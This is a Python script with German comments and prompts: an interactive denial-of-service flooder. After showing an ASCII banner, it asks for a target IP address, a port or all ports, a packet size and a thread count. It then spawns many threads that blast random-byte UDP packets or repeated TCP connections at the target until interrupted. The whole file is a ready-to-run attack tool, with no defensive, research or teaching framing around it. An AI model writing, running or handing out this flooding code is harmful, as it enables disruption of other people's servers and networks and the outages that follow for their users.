import os
import random
import socket
import threading
import sys

# Globale Variablen
stop_event = threading.Event()

# Banner mit Anpassungsmöglichkeiten
def show_banner():
    os.system("clear")
    sys.stdout.write("""
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██████╔╝██████╔╝██║   ██║█████╗  
██╔═══╝ ██╔═══╝ ██║   ██║██╔══╝  
██║     ██║     ╚██████╔╝███████╗
╚═╝     ╚═╝      ╚═════╝ ╚══════╝
    """)
    sys.stdout.flush()

# UDP Flood
def udp_flood(ip, port, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    sent = 0
    while not stop_event.is_set():
        try:
            sock.sendto(udp_bytes, (ip, port))
            sent += 1
            port = port + 1 if port < 65534 else 1
            sys.stdout.write(f"\rGesendet {sent} UDP-Pakete an {ip} über Port {port}")
            sys.stdout.flush()
        except:
            pass

# TCP Flood
def tcp_flood(ip, port, packet_size):
    sent = 0
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(random._urandom(packet_size))
            sent += 1
            sys.stdout.write(f"\rGesendet {sent} TCP-Pakete an {ip} über Port {port}")
            sys.stdout.flush()
        except:
            pass
        finally:
            sock.close()

# Hauptprogramm
if __name__ == "__main__":
    show_banner()

    ip = input("Ziel-IP-Adresse: ")
    port = int(input("Ziel-Port (-1 für alle Ports): "))
    packet_size = int(input("Paketgröße in Bytes: "))
    num_threads = int(input("Anzahl der Threads: "))

    if port == -1:
        port_range = list(range(1, 65535))
    else:
        port_range = [port]

    attack_function = udp_flood if input("Wählen Sie 'udp' oder 'tcp': ").lower() == "udp" else tcp_flood

    stop_event.clear()
    threads = [
        threading.Thread(target=attack_function, args=(ip, port, packet_size))
        for port in port_range for _ in range(num_threads)
    ]
    for thread in threads:
        thread.daemon = True
        thread.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        stop_event.set()
        sys.stdout.write("\nAngriff gestoppt.\n")
